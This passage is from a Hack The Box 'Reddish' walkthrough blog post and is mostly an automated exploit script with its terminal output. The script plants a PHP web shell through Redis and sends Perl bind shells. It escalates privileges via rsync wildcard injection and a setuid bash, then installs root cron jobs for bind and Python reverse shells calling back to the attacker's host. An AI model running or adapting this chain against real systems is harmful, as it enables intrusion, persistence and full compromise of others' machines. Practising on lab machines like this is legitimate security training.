class="string">&quot;1&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Uploading &quot;</span> + UUIDNAME + <span class="string">&quot;.php on the www container via redis&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&quot;/bin/echo -ne &#x27;*1\\r\\n<span class="variable">$8</span>\\r\\nFLUSHALL\\r\\n*3\\r\\n<span class="variable">$3</span>\\r\\nSET\\r\\n<span class="variable">$1</span>\\r\\n1\\r\\n<span class="variable">$45</span>\\r\\n&lt;?php echo shell_exec(<span class="variable">$_GET</span>[\&quot;e\&quot;].\&quot; 2&gt;&amp;1\&quot;); ?&gt;\\r\\n*4\\r\\n<span class="variable">$6</span>\\r\\nCONFIG\\r\\n<span class="variable">$3</span>\\r\\nSET\\r\\n<span class="variable">$10</span>\\r\\ndbfilename\\r\\n<span class="variable">$12</span>\\r\\n&quot;</span> + UUIDNAME +  <span class="string">&quot;.php\\r\\n*4\\r\\n<span class="variable">$6</span>\\r\\nCONFIG\\r\\n<span class="variable">$3</span>\\r\\nSET\\r\\n<span class="variable">$3</span>\\r\\ndir\\r\\n<span class="variable">$46</span>\\r\\n/var/www/html/8924d0549008565c554f8128cd11fda4\\r\\n*1\\r\\n<span class="variable">$4</span>\\r\\nSAVE\\r\\n&#x27; | &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; - TCP:redis:6379&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;/bin/echo -ne &#x27;GET /8924d0549008565c554f8128cd11fda4/&quot;</span> + UUIDNAME+ <span class="string">&quot;.php?e=<span class="subst">$(whoami)</span>@<span class="subst">$(hostname)</span>END HTTP/1.1\\r\\nHost: nodered\\r\\nUser-agent: curl\\r\\n\\r\\n&#x27; | &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; - TCP:www:80&quot;</span>)</span><br><span class="line">    output = socat.recvuntil(<span class="string">&quot;www-data@www&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;www-data@www&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        p.success(<span class="string">&quot;OK (user = www-data@www)&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Sending perl bind shell [www-data@www:&quot;</span> + str(LPORT2) + <span class="string">&quot;] via &quot;</span> + UUIDNAME + <span class="string">&quot;.php &amp; trying to connect&quot;</span>) as p:</span><br><span class="line">    perl_payload = <span class="string">&quot;perl -e &#x27;use Socket;<span class="variable">$p</span>=&quot;</span> + str(LPORT2) +<span class="string">&quot;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));bind(S,sockaddr_in(<span class="variable">$p</span>, INADDR_ANY));listen(S,SOMAXCONN);for(;<span class="variable">$p</span>=accept(C,S);close C)&#123;open(STDIN,\&quot;&gt;&amp;C\&quot;);open(STDOUT,\&quot;&gt;&amp;C\&quot;);open(STDERR,\&quot;&gt;&amp;C\&quot;);exec(\&quot;/bin/bash -i\&quot;);&#125;;&#x27;&quot;</span></span><br><span class="line">    urled_perl_payload = urllib.quote_plus(perl_payload)</span><br><span class="line">    socat.sendline(<span class="string">&quot;/bin/echo -ne &#x27;GET /8924d0549008565c554f8128cd11fda4/&quot;</span> + UUIDNAME + <span class="string">&quot;.php?e=&quot;</span> + urled_perl_payload + <span class="string">&quot; HTTP/1.1\\r\\nHost: nodered\\r\\nUser-Agent: curl\\r\\n\\r\\n&#x27; | &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; - TCP:www:80&quot;</span>)</span><br><span class="line">    socat.sendline(SOCAT_DSTPATH + <span class="string">&quot; file:`tty`,echo=0,rawer TCP:www:&quot;</span> + str(LPORT2))</span><br><span class="line">    output = socat.recvuntil(<span class="string">&quot;shell&quot;</span>, <span class="built_in">timeout</span>=20)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;shell&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    socat.sendline(<span class="string">&quot;script --return -c &#x27;/bin/bash -i&#x27; /dev/null&quot;</span>)</span><br><span class="line">    socat.clean(1)</span><br><span class="line">    socat.sendline(<span class="string">&quot;stty raw -echo&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Exploiting wildcards for privesc. Wait at most 180 secs for rsync backup job to run&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&#x27;echo &quot;/bin/cp /bin/bash &#x27;</span> + SUBASH_PATH + <span class="string">&#x27;;/bin/chmod 4755 &#x27;</span> + SUBASH_PATH + <span class="string">&#x27;&quot; &gt; &quot;/var/www/html/f187a0ec71ce99642e4f0afbd441a68b/&#x27;</span> + UUIDNAME + <span class="string">&#x27;.rdb&quot;&#x27;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&#x27;touch &quot;/var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e sh &#x27;</span> + UUIDNAME + <span class="string">&#x27;.rdb&quot;&#x27;</span>)</span><br><span class="line">    count = 0</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        p.status(str(count))</span><br><span class="line">        <span class="built_in">sleep</span>(1)</span><br><span class="line">        socat.sendline(<span class="string">&quot;[ -f &quot;</span> + SUBASH_PATH + <span class="string">&quot; ] &amp;&amp; echo &#x27;OK&#x27; || echo &#x27;NO&#x27;&quot;</span>)</span><br><span class="line">        socat.recvuntil(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">        output = socat.recv(3).strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;OK&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">            p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        count += 1</span><br><span class="line">        <span class="keyword">if</span> count &gt; 180:</span><br><span class="line">            p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">    socat.sendline(SUBASH_PATH + <span class="string">&#x27; -i -p&#x27;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;cd /root&quot;</span>)</span><br><span class="line">    socat.clean(1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Sending a cronjob for bind shell [root@backup:&quot;</span> +str(LPORT3)+ <span class="string">&quot;]. Please wait&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;use Socket;<span class="variable">$p</span>=&quot;</span> + str(LPORT3) + <span class="string">&quot;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));bind(S,sockaddr_in(<span class="variable">$p</span>, INADDR_ANY));listen(S,SOMAXCONN);for(;<span class="variable">$p</span>=accept(C,S);close C)&#123;open(STDIN,\&quot;&gt;&amp;C\&quot;);open(STDOUT,\&quot;&gt;&amp;C\&quot;);open(STDERR,\&quot;&gt;&amp;C\&quot;);exec(\&quot;/bin/bash -i\&quot;);&#125;;&#x27; &gt; &quot;</span> + CRONPL_PATH + <span class="string">&quot;.pl&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;* * * * * root /usr/bin/perl &quot;</span> + CRONPL_PATH +  <span class="string">&quot;.pl&#x27; &gt; &quot;</span> + CRONPL_PATH + <span class="string">&quot;cronjob&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;rsync -a &quot;</span> + CRONPL_PATH + <span class="string">&quot;.pl backup::src&quot;</span> + CRONPL_PATH + <span class="string">&quot;.pl&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;rsync -a &quot;</span> + CRONPL_PATH + <span class="string">&quot;cronjob backup::src/etc/cron.d/&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(62):</span><br><span class="line">        p.status(str(61 - i))</span><br><span class="line">        time.sleep(1)</span><br><span class="line">    socat.sendline(<span class="string">&quot;perl -MFcntl=F_SETFL,F_GETFL,O_NONBLOCK -MSocket &#x27;-e<span class="variable">$0</span>=perl;socket(<span class="variable">$c</span>,AF_INET,SOCK_STREAM,0)&amp;&amp;connect(<span class="variable">$c</span>,pack_sockaddr_in(&quot;</span>+ str(LPORT3) + <span class="string">&quot;,inet_aton(\&quot;backup\&quot;)))||die$!;fcntl<span class="variable">$_</span>,F_SETFL,O_NONBLOCK|fcntl<span class="variable">$_</span>,F_GETFL,0 for@d=(*STDIN,<span class="variable">$c</span>),@e=(<span class="variable">$c</span>,*STDOUT);L:for(0,1)&#123;sysread(<span class="variable">$d</span>[<span class="variable">$_</span>],<span class="variable">$f</span>,8**5)||exit and<span class="variable">$f</span>[<span class="variable">$_</span>].=<span class="variable">$f</span> if vec<span class="variable">$g</span>,<span class="variable">$_</span>*(<span class="variable">$h</span>=fileno<span class="variable">$c</span>),1;substr<span class="variable">$f</span>[<span class="variable">$_</span>],0,syswrite(<span class="variable">$e</span>[<span class="variable">$_</span>],<span class="variable">$f</span>[<span class="variable">$_</span>],8**5),\&quot;\&quot;;vec(<span class="variable">$g</span>,<span class="variable">$_</span>*<span class="variable">$h</span>,1)=(<span class="variable">$i</span>=length<span class="variable">$f</span>[<span class="variable">$_</span>]&lt;8**5);vec(<span class="variable">$j</span>,<span class="variable">$_</span>||<span class="variable">$h</span>,1)=!!<span class="variable">$i</span>&#125;select<span class="variable">$g</span>,<span class="variable">$j</span>,<span class="variable">$k</span>,5;goto L&#x27;&quot;</span>)</span><br><span class="line">    output = socat.recvuntil(<span class="string">&quot;shell&quot;</span>, <span class="built_in">timeout</span>=20)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;shell&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    socat.sendline(<span class="string">&quot;script --return -c &#x27;/bin/bash -i&#x27; /dev/null&quot;</span>)</span><br><span class="line">    socat.clean(1)</span><br><span class="line">    socat.sendline(<span class="string">&quot;stty raw -echo&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;4&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Sending reverse shell cronjob [&quot;</span> + LHOST + <span class="string">&quot;:&quot;</span> +str(LPORT4)+ <span class="string">&quot;] for root@host. Please wait&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&quot;mkdir /mnt/sda1&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;mount /dev/sda1 /mnt/sda1&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;cat /mnt/sda1/root/root.txt&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;&quot;</span> + LHOST + <span class="string">&quot;\&quot;,&quot;</span> + str(LPORT4) + <span class="string">&quot;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\&quot;HISTFILE\&quot;,\&quot;/dev/null\&quot;);pty.spawn([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;]);s.close();exit();&#x27; &gt; /mnt/sda1/tmp/&quot;</span> + UUIDNAME + <span class="string">&quot;.py&quot;</span>) </span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;* * * * * root /usr/bin/python /tmp/&quot;</span> + UUIDNAME + <span class="string">&quot;.py&#x27; &gt; /mnt/sda1/etc/cron.d/&quot;</span> + UUIDNAME + <span class="string">&quot;cronjob&quot;</span>)</span><br><span class="line">    host_shell = listen(LPORT4, bindaddr=LHOST, <span class="built_in">timeout</span>=65).wait_for_connection()</span><br><span class="line">    <span class="keyword">if</span> host_shell.sock is None:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    host_shell.interactive()</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>

<p>effect as below:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># python autopwnreddish.py </span></span><br><span class="line">What shell <span class="keyword">do</span> you want?</span><br><span class="line">[1] root@nodered</span><br><span class="line">[2] www-data@www</span><br><span class="line">[3] root@www</span><br><span class="line">[4] root@backup</span><br><span class="line">[5] root@reddish</span><br><span class="line">[6] Exit</span><br><span class="line">Please enter a number 1-6: 1</span><br><span class="line">[+] Getting our <span class="built_in">id</span>: OK (<span class="built_in">id</span> = c507228abb96d45d0541fd5eacebd9dd)</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to 10.10.14.9 on port 60000: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on 10.10.14.9:60000: Got connection from 10.10.10.94 on port 36186</span><br><span class="line">[+] Loading node-red flows: OK</span><br><span class="line">[+] Injecting base64-encoded socat: OK</span><br><span class="line">[+] Injecting socat reverse shell via nodejs [10.10.14.9:60000]: OK</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">root@nodered:/node-red<span class="comment"># $ id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@nodered:/node-red<span class="comment"># $ whoami</span></span><br><span class="line">root</span><br><span class="line">root@nodered:/node-red<span class="comment"># $ cd ~</span></span><br><span class="line">root@nodered:~<span class="comment"># $ ls</span></span><br><span class="line">root@nodered:~<span class="comment"># $ exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[*] Closed connection to 10.10.10.94 port 36186</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># python autopwnreddish.py </span></span><br><span class="line">What shell <span class="keyword">do</span> you want?</span><br><span class="line">[1] root@nodered</span><br><span class="line">[2] www-data@www</span><br><span class="line">[3] root@www</span><br><span class="line">[4] root@backup</span><br><span class="line">[5] root@reddish</span><br><span class="line">[6] Exit</span><br><span class="line">Please enter a number 1-6: 5</span><br><span class="line">[+] Getting our <span class="built_in">id</span>: OK (<span class="built_in">id</span> = c507228abb96d45d0541fd5eacebd9dd)</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to 10.10.14.9 on port 60000: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on 10.10.14.9:60000: Got connection from 10.10.10.94 on port 36192</span><br><span class="line">[+] Loading node-red flows: OK</span><br><span class="line">[+] Injecting base64-encoded socat: OK</span><br><span class="line">[+] Injecting socat reverse shell via nodejs [10.10.14.9:60000]: OK</span><br><span class="line">[+] Uploading 83df6e1b.php on the www container via redis: OK (user = www-data@www)</span><br><span class="line">[+] Sending perl <span class="built_in">bind</span> shell [www-data@www:62236] via 83df6e1b.php &amp; trying to connect: OK</span><br><span class="line">[+] Exploiting wildcards <span class="keyword">for</span> privesc. Wait at most 180 secs <span class="keyword">for</span> rsync backup job to run: OK</span><br><span class="line">[+] Sending a cronjob <span class="keyword">for</span> <span class="built_in">bind</span> shell [root@backup:65274]. Please <span class="built_in">wait</span>: OK</span><br><span class="line">[+] Sending reverse shell cronjob [10.10.14.9:60001] <span class="keyword">for</span> root@host. Please <span class="built_in">wait</span>: OK</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to 10.10.14.9 on port 60001: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on 10.10.14.9:60001: Got connection from 10.10.10.94 on port 49704</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">root@reddish:~<span class="comment"># $ id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@reddish:~<span class="comment"># $ whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@reddish:~<span class="comment"># $ hostname</span></span><br><span class="line">hostname</span><br><span class="line">reddish</span><br><span class="line">root@reddish:~<span class="comment"># $ ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@reddish:~<span class="comment"># $ cat root.txt</span></span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">50d0db644c8d5ff5312ef3d17c2ed205</span><br></pre></td></tr></table></figure>

<p>very very powerful scripts!!!</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb59.jpg"></li>
</ul>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>Code Execution and getShell in Node-Red</li>
<li>Network Enumeration and ping sweep</li>
<li>upgrade path to Meterpreter using sessions -u</li>
<li>compolicated port forwarding tech</li>
<li>error information disclosure</li>
<li>redis service getshell</li>
<li>socat port forwarding</li>
<li>Exploiting the Wildcard and cronjob to privesc</li>
<li>perl and port forwarding to download file</li>
<li>use port 873 rsync service and cron job to getshell and privesc</li>
<li>beyong root research</li>
<li>Dropbear Create Tunnel and get root shell</li>
<li>python auto-pwn script</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2020/07/19/reddish/" title="Hack-The-Box-walkthrough[reddish]">https://fdlucifer.github.io/2020/07/19/reddish/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/07/12/SneakyMailer/" rel="prev" title="Hack-The-Box-walkthrough[SneakyMailer]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[SneakyMailer]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2020/08/17/all-about-ctf/" rel="next" title="all-things-about-ctf">
                  all-things-about-ctf <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">628k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">38:05</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
